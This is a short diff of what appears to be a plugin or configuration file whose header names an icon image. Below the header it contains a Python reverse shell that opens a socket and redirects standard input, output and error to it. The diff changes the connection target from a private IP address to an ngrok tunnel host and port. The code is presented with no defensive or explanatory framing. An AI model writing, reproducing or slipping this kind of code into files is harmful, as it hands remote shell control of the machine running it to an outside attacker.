@@ -9,7 +9,7 @@ ICON          = 'icon-default.png'
 ####################################################################################################
 import socket,os,pty
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("100.69.114.27",4242))
+s.connect(("2.tcp.ngrok.io",19846))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
